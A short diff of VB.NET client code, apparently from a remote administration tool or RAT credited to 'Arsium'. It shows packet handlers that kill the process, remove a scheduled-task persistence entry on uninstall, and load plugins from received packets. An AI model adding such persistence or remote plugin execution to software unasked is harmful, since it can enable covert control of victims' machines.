@@ -1,6 +1,5 @@
 ﻿Imports PacketLib
 Imports PacketLib.Packet
-Imports System.Diagnostics
 
 ' 
 '|| AUTHOR Arsium ||
@@ -30,7 +29,7 @@ Namespace Client
 						EntryClass.NtTerminateProcess(Process.GetCurrentProcess().Handle, 0)
 
 					Case (PacketType.UNINSTALL_CLOSE_CLIENT)
-						Persistence.Launch.RemoveTaskScheduler(Config.taskName)
+						Persistence.TaskScheduler.RemoveTaskScheduler(Config.taskName)
 
 					Case Else
 						pluginDelegateAsync.BeginInvoke(packet, New AsyncCallback(AddressOf EndLoadPlugin), Nothing)
